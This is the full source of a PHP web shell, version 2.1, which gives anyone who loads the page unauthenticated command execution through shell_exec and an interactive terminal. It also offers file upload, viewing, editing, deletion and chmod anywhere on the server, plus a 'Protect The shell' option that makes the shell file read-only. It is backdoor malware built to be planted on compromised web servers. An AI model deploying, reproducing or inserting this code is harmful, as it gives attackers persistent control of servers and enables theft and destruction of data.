<?php
$version = "2.1";
if(isset($_POST['uplood'])) {
$uploaddir = $_POST['path'];
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
echo "<script>document.location='?path=" . addslashes($uploaddir) . "'</script>";
        } else {
echo "<script>document.location='?path=" . addslashes($uploaddir) . "'</script>";
        }}
}
if (isset($_POST['edit'])) {
$source = $_POST['source'];
$source = str_replace("\\'","'",$source);
$source = str_replace("\\\\","\\",$source);
$source = str_replace('\\"','"',$source);
$source = str_replace('&lt;','<',$source);
$source = str_replace('&gt;','>',$source);
$source = str_replace('&amp;','&',$source);
$source = str_replace('uiiplastzo','+',$source);
        $a = $source;
echo $a;
        $myFile = $_POST['path'];
        $fh = fopen($myFile, 'w') or die("can't open file");
        fwrite($fh, $a);
        fclose($fh);
die();
}

if (isset($_POST['action'])) {
if (isset($_POST['path'])) {
if (isset($_POST['mod'])) {
$mod = intval($_POST['mod'],8);
chmod($_POST['path'], $mod);
die();
}}}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
$oz = 'win';
}
else {
$oz = 'linux';
}


$action = 'fm';
if(isset($_GET['action'])) {
$action = $_GET['action'];
}

if($action =='dt') {
if(isset($_GET['path'])) {
if(isset($_GET['file'])) {
unlink($_GET['path'] . $_GET['file']);
echo '<script>document.location="?path=' .  addslashes($_GET['path']) . '";</script>';
}}
};
if($action =='fs') {
$path = $_GET['path'];
$command = $_GET['cm'];
$command = str_replace("amp;","",$command);
$command = str_replace("&lt;","<",$command);
$command = str_replace("&gt;",">",$command);
$command = str_replace("\n","",$command);
$path = str_replace("\n","",$path);
shell_exec('cd ' . $path . ' && ' . $command);
echo '<script>document.location="?path=' .  addslashes($_GET['path']) . '";</script>';
}

if($action =='dtd') {
if(isset($_GET['path'])) {
if(isset($_GET['file'])) {
rmdir($_GET['path'] . $_GET['file']);
echo '<script>document.location="?path=' .  addslashes($_GET['path']) . '";</script>';
}}
};

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
$os = 1;
$dd = 'cd';
}
else {
$os = 2;
$dd = 'pwd';
}
if(isset($_POST['start'])) {
if($os ==1) {
$command = 'cd';
}
else {
$command = 'pwd';
}
$output = shell_exec($command);
echo $output;
die();
}

if(isset($_POST['command'])) {
if(isset($_POST['path'])) {
$command = $_POST['command'];
$command = str_replace("amp;","",$command);
$command = str_replace("&lt;","<",$command);
$command = str_replace("&gt;",">",$command);
$command = str_replace("\n","",$command);
$path = $_POST['path'];
$path = str_replace("\n","",$path);
echo shell_exec('cd ' . $path . ' && ' . $command . ' && echo z3r0separator && ' . $dd);
die();
}
}

?>
<html>
<head>
<style>
body {
background-color:black;
white-space: pre-wrap;
color:lightgray;
font-family:Lucida Console;
}
span,input,textarea {
outline:0;
}
pre {
white-space: pre-wrap;
margin:0px;
font-family: Lucida Console;
}

table {
white-space: pre-wrap;
margin:0px;
border-style:none;
font-family: Lucida Console;
}

::-webkit-scrollbar-thumb {
  background-color: #fff;
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 1);
  border-radius: 10px;
}
 
::-webkit-scrollbar-thumb:vertical:hover { 
  background-color: #fff;


}
::-webkit-scrollbar {
      width: 15px;
} 


::-webkit-scrollbar-corner {
	border-bottom-right-radius:20px;
} 
a {
color:lightgray;
}
tr:hover {
background-color:#111;
}
input {
color:lightgray;
background-color:black;
font-family:Lucida Console;
border-style:none;
}
</style>
</head>
<body>
/**************************************************************************************/
*blank*
/**************************************************************************************/ <?= $version ?>
<?php
echo '<table><tr><td>';
echo 'User             : ' . get_current_user() . "    \n";
echo 'OS               : ' . PHP_OS . "    \n";
echo '</td><td>';
echo 'Server IP Address: ' . $_SERVER['SERVER_ADDR'] . "\n";
echo 'Software         : ' . $_SERVER["SERVER_SOFTWARE"] . "\n";
echo '</td></tr></table>';
?>
<a href="?">File manager</a> | <a href="?action=sh">Shell</a> | <a href="?action=pr">Protect The shell</a>
<?php
if($action == 'sh') {
?>

<div id="shell">
</div>

<script>

  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

function line(path) {
if(path == undefined) {
path = "/i/dont/know";
}
path = path;
statement = path.replace(/\n/g,"") + '</font>><span id="command" onkeypress="runScript(event)"></span>';
document.getElementById("shell").innerHTML += statement;
document.getElementById("command").contentEditable = true;
document.getElementById("command").focus();
}

function runScript(e) {
    if (e.keyCode == 13) {
exec();
document.getElementById("command").contentEditable = false;
document.getElementById("command").id = "done";
backup = path;
    }
}

function exec() {
command = document.getElementById("command").innerHTML;
xmlhttp.open("POST",document.location,true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("command=" + command.replace(/&/g,"%26") + "&path=" + path.replace(/&/g,"%26"));
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
results = xmlhttp.responseText.replace("\n","").split(<?php if($os==1){echo '"z3r0separator "';}else{echo '"z3r0separator"';}?>);
path = results[1];
result = results[0];
result = result.replace(/&lt;/g,"<");
result = result.replace(/&gt;/g,">");
if(path == undefined) {
path = backup;
}
statement = "<pre>" + result + "</pre>"
document.getElementById("shell").innerHTML += statement;
line(path);
    }
  }
}

function start() {
xmlhttp.open("POST",document.location,true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
path =xmlhttp.responseText;
line(path);
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("start=1");
}

start();
</script>


<?php
}


if($action == 'pr') {
chmod($SCRIPT_FILENAME, 0555);
echo 'Protected!';
}

if($action == 'fm') {
$path = realpath(dirname(__FILE__));
if(isset($_GET['path'])) {
$path = $_GET['path'];
}
chdir($path);
$path = realpath($path);
$path = str_replace("\\","/",$path);
$dirs = explode("/",$path);
$dirsc = count($dirs);
echo 'path : ';
for($i=0;$i<$dirsc;$i++) {
$hr .= $dirs[$i] . "/";
echo "<a href=?path=$hr>$dirs[$i]</a>/";
}
$iterator = new DirectoryIterator($path);
echo '<table>';
echo '<tr><td>name</td><td>view     </td><td>edit     </td><td>delete     </td><td>Perms     </td><td>IsWritable</td><td>Last Modified</td><td>Size</td></tr>';
foreach ($iterator as $fileinfo) {
    if ($fileinfo->isDir()) {
        $octal_perms = substr(sprintf('%o', $fileinfo->getPerms()), -4);
        echo '<tr><td>[<a href="?path=' . $path . '/' . $fileinfo->getFilename() . '">' . $fileinfo->getFilename() . '</a>]</td><td><a href="?path=' . $path . '/' . $fileinfo->getFilename() . '">#</a></td><td></td><td><a href="?action=dtd&path=' . $path . '/&file=' . $fileinfo->getFilename()  . '">#</a></td><td><span id="perms"><a href=javascript:chmod("' . $path . '/' . $fileinfo->getFilename() .  '")>' . $octal_perms . '</a></span></td><td>' . $fileinfo->isWritable() . "</td><td>" . date ("F d Y H:i:s.", filemtime($path . '/' . $fileinfo->getFilename())) . "</td><td>Dir</td></tr>\n";
    }
}
foreach ($iterator as $fileinfo) {
    if ($fileinfo->isFile()) {
        $octal_perms = substr(sprintf('%o', $fileinfo->getPerms()), -4);
$msize = filesize($path . '/' . $fileinfo->getFilename());
$msize = $msize / 1000;
$size = "$msize";
$size = str_replace(".",",",$size);
$size = str_replace("0,0","",$size);
$size = str_replace("0,","",$size);
        echo '<tr><td><a href="?action=vw&path=' . $path . '&file=' . $fileinfo->getFilename() . '">' . $fileinfo->getFilename() . '</a></td><td><a href="?action=vw&path=' . $path . '&file=' . $fileinfo->getFilename() . '">#</a></td><td><a href="?action=ed&path=' . $path . '&file=' . $fileinfo->getFilename() . '">#</a></td><td><a href="?action=dt&path=' . $path . '/&file=' . $fileinfo->getFilename()  . '">#</a></td><td><span id="perms"><a href=javascript:chmod("' . $path . '/' . $fileinfo->getFilename() .  '")>' . $octal_perms . '</a></span></td><td>' . $fileinfo->isWritable() . "</td><td>" . date ("F d Y H:i:s.", filemtime($path . '/' . $fileinfo->getFilename())) . "</td><td>" . $size . " Bytes</td></tr>\n";
    }
}
echo '</table>';
?>

Change dir: <span id="direc" contenteditable="true"><?= $path ?></span><input type="button" onclick="go()" value="Go">
Execute   : <span id="com" contenteditable="true"></span><input type="button" onclick="exec()" value="Go">
<form action="?" method="POST" enctype="multipart/form-data" name="myForm"><input type="hidden" name="uplood" value="1"><input type="hidden" name="path" value="<?= $path ?>/">Upload    : <span id="yourBtn" onclick="getFile()">Click</span><input id="upfile" name="userfile" type="file" style="display:none;" value="upload" onchange="sub(this)"/>  <span onclick="up()">Upload</span>
<script>
 function getFile(){
   document.getElementById("upfile").click();
 }
 function sub(obj){
    var file = obj.value;
    var fileName = file.split("\\");
    document.getElementById("yourBtn").innerHTML = fileName[fileName.length-1];
  }
function up() {
document.myForm.submit();
    event.preventDefault();
}
  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
function go() {
z = document.getElementById("direc").innerHTML;
document.location = "?path=" + z;
}

function exec() {
x = document.getElementById("direc").innerHTML;
z = document.getElementById("com").innerHTML;
document.location = "?action=fs&path=" + x + "&cm=" + z;
}

function chmod(path) {
var mod = prompt("Chmod : " + path , "0755");
if(mod.length == 4) {
xmlhttp.open("POST","?",true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
alert("Permschanged.")
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("action=cm&path=" + path + "&mod=" + mod);
}
}
</script>
<?php
}
if($action=='vw') {
$path = "";
$file = "";
if(isset($_GET['path'])) {
$path = $_GET['path'] . '/';
}
if(isset($_GET['file'])) {
$file = $_GET['file'];
}
$source = file_get_contents($path . $file);
echo "Directory : <a href=?path=$path>$path</a> \n";
echo "Filename  : $file \n";
echo "Fullpath  : $path$file \n\n";
$source = str_replace("<","&lt;",$source);
$source = str_replace(">","&gt;",$source);
echo $source;
}

if($action=='ed') {
$path = "";
$file = "";
if(isset($_GET['path'])) {
$path = $_GET['path'] . '/';
}
if(isset($_GET['file'])) {
$file = $_GET['file'];
}
$source = file_get_contents($path . $file);
echo "Directory : <a href=?path=$path>$path</a> \n";
echo "Filename  : $file \n";
echo "Fullpath  : $path$file \n\n";
$source = str_replace("&lt;","&lt;",$source);
$source = str_replace("&gt;","&gt;",$source);
$source = str_replace("&","&amp;",$source);
$source = str_replace("<","&lt;",$source);
$source = str_replace(">","&gt;",$source);
$source = str_replace("&gt;","&amp;gt;",$source);
$source = str_replace("&lt;","&amp;lt;",$source);
echo '<form method="post" action="javascript:edit();"><input type="hidden" id="path" name="path" value="' . $path . $file . '"><span name="source" id="source" contenteditable="true">' . $source . '</span><br><br><br><input type="submit"></form>';
?>
<script>

  if (window.XMLHttpRequest) {
    // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else {  // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

function edit() {
source = document.getElementById("source").innerHTML;
source = source.replace(/&/g,"%26");
source = source.replace(/\+/g,"uiiplastzo");
xmlhttp.open("POST","?",true);
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
alert("Saved.")
    }
  }
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("source=" + source + "&path=" + document.getElementById("path").value + "&edit=1");
}
</script>
<?php
}

?>
</body>
</html>